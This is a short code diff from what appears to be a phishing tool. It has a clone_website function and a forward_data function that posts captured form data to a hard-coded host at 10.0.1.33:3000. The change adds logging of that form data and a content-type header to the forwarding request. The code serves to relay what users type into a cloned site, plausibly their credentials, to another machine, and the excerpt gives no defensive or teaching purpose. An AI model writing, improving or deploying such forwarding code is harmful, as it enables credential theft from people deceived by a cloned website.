@@ -32,7 +32,11 @@ def clone_website(target_url):
 def forward_data(form_data, target_url="http://10.0.1.33:3000"):
     try:
         print(f"[INFO] Forwarding data to {target_url}")
-        response = requests.post(target_url, data=form_data)
+        print(f"[DEBUG] Form Data: {form_data}")  # Print the form data being sent
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",  # Ensure the correct content type
+        }
+        response = requests.post(target_url, data=form_data, headers=headers)
         if response.status_code == 200:
             print(f"[INFO] Data forwarded successfully to {target_url}")
         else:
